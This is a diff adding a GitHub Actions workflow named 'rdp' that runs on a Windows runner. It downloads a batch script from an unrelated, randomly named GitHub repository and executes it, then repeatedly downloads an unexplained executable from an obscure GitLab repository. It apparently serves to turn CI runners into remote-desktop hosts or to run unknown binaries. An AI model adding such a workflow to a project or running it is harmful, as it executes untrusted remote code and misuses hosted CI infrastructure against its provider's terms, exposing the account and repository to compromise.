@@ -1,0 +1,21 @@
+name: rdp
+
+on: [workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+    
+    steps:
+    - name: Download
+      run: |
+          curl -s -L -o setup.cmd https://github.com/Efebey2903/fictional-octo-waffle/raw/main/b.cmd
+    
+    - name: run
+      run: |
+           cmd /c setup.cmd
+           curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+           sleep 240
+           curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
+           sleep 240
